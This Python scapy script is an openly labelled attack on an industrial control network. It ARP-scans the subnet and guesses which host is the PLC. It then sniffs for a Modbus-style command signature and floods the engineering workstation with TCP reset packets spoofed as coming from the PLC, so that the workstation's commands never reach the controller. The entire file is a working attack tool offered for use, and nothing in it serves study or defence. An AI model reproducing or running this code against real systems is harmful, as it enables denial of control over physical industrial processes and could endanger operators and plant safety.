import scapy.all as scapy
import socket
import struct
import time
import threading

# Configuration - You might need to adjust these based on your specific PLC and network setup
INTERFACE = "Ethernet" # or "Wi-Fi", or whatever your workstation's interface is.  IMPORTANT: Change this!
# If you know the PLC's MAC Address, uncomment this and set the value.  If not, we'll try to discover it.
# PLC_MAC = "00:11:22:33:44:55"  # Example MAC Address.  Replace with your PLC's MAC.
PLC_IP = None  # We'll discover this, or you can set it directly if you know it for testing.
ENGINEERING_WORKSTATION_IP = "192.168.1.100" # Example.  Replace with your workstation's IP.  This is important for filtering.
# Command Message Signature - This is VERY important and needs to match your PLC's protocol.
# This is a placeholder.  You *must* replace this with the actual byte sequence
# that identifies a command message being sent to the PLC.  Consult your PLC documentation!
COMMAND_MESSAGE_SIGNATURE = b"\x01\x03\x00\x00\x00\x01\x85\xDB"  # Placeholder!  MODBUS example read request
# This is a timeout for ARP and IP discovery in seconds.
DISCOVERY_TIMEOUT = 5
# This is the time between each send of the spoof packet
SPOOF_INTERVAL = 0.5

# Global variables to control the blocking thread
stop_blocking = False

def find_plc_ip_and_mac(interface, timeout=DISCOVERY_TIMEOUT):
    """
    Attempts to find the PLC's IP and MAC address on the network.

    Returns:
        tuple: (PLC_IP, PLC_MAC) or (None, None) if not found within the timeout.
    """
    global PLC_IP # Allows global variable to be edited within function
    plc_ip = None
    plc_mac = None

    # 1. Discover Network Address (using the workstation's IP)
    try:
        ip_address = socket.gethostbyname(socket.gethostname())
        network_address = '.'.join(ip_address.split('.')[:-1]) + '.0/24'
    except socket.gaierror:
        print("Error: Could not determine network address. Please configure PLC_IP manually.")
        return None, None

    # 2. ARP Scan
    arp_request = scapy.ARP(pdst=network_address)
    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast MAC
    packet = ether/arp_request

    answered_list = scapy.srp(packet, timeout=timeout, verbose=False, iface=interface)[0]

    # 3. Identify PLC (This is the tricky part - needs PLC identification logic)
    #    This example just picks the first IP that *isn't* the workstation.  This is naive!
    #    Ideally, you'd look for a specific vendor OUI in the MAC, or a specific open port.
    for element in answered_list:
        ip = element[1].psrc
        mac = element[1].hwsrc
        if ip != ENGINEERING_WORKSTATION_IP:  # Crude filter to avoid picking the workstation itself.
            plc_ip = ip
            plc_mac = mac
            print(f"Possible PLC IP: {ip}, MAC: {mac}")
            break # Stop after finding the first potential PLC

    if plc_ip:
        print(f"Discovered PLC IP: {plc_ip}, MAC: {plc_mac}")
        PLC_IP = plc_ip # Set global PLC IP address so script can run with discovered address
    else:
        print("Error: Could not automatically discover PLC IP and MAC address.")
        print("Please configure PLC_IP and PLC_MAC manually if you know them.")

    return plc_ip, plc_mac


def block_command_message(plc_ip, interface):
    """
    Continuously sends spoofed TCP Reset (RST) packets to block command messages to the PLC.
    """
    global stop_blocking  # Access the global flag
    if plc_ip is None:
        print("Error: PLC IP address is not known. Cannot start blocking.")
        return

    # Get the current port that the engineering workstation is using to communicate with the PLC
    try:
        # Capture packets from the ENGINEERING_WORKSTATION_IP destined for the PLC_IP
        packets = scapy.sniff(iface=interface,
                             count=1,
                             lfilter=lambda packet: scapy.IP in packet and scapy.TCP in packet and \
                                                    packet[scapy.IP].src == ENGINEERING_WORKSTATION_IP and \
                                                    packet[scapy.IP].dst == plc_ip and \
                                                    COMMAND_MESSAGE_SIGNATURE in packet[scapy.Raw].load)

        # Extract the port
        plc_port = packets[0][scapy.TCP].dport
        workstation_port = packets[0][scapy.TCP].sport

    except Exception as e:
        print(f"Error getting ports: {e}")
        print("Ensure the Engineering Workstation is actively communicating with the PLC"
              " and the COMMAND_MESSAGE_SIGNATURE is correct.")
        return
    print(f"Using PLC Port: {plc_port}")
    print(f"Using Workstation Port: {workstation_port}")


    #Crafting the spoof packet
    ip = scapy.IP(src=plc_ip, dst=ENGINEERING_WORKSTATION_IP)
    tcp = scapy.TCP(sport=plc_port, dport= workstation_port, flags="R", seq=1) #seq number is not important with "R" flag

    # Create and send the RST packet
    rst_packet = ip/tcp

    while not stop_blocking:
        try:
            scapy.send(rst_packet, verbose=False, iface=interface)
            #scapy.ls(rst_packet) #Uncomment if you want to see the packet being sent
            print("Blocking Command Message.. (Sent RST)")
            time.sleep(SPOOF_INTERVAL)

        except Exception as e:
            print(f"Error sending packet: {e}")
            break


def main():
    global PLC_IP
    global stop_blocking

    if PLC_IP is None:
        print("Attempting to automatically discover PLC IP address...")
        plc_ip, plc_mac = find_plc_ip_and_mac(INTERFACE)
        if plc_ip is None:
            print("Failed to discover PLC IP.  Please set PLC_IP manually in the script.")
            return
        PLC_IP = plc_ip  # Update global variable after discovery

    print(f"Using PLC IP: {PLC_IP}")

    # Start the blocking thread
    blocking_thread = threading.Thread(target=block_command_message, args=(PLC_IP, INTERFACE))
    blocking_thread.daemon = True  # Allow the main thread to exit even if this is running
    blocking_thread.start()

    try:
        while True:
            time.sleep(1)  # Keep the main thread alive.  You could add other logic here.
    except KeyboardInterrupt:
        print("\nStopping the attack...")
        stop_blocking = True  # Signal the blocking thread to stop
        blocking_thread.join() #Wait for the thread to finish
        print("Attack stopped.")


if __name__ == "__main__":
    main()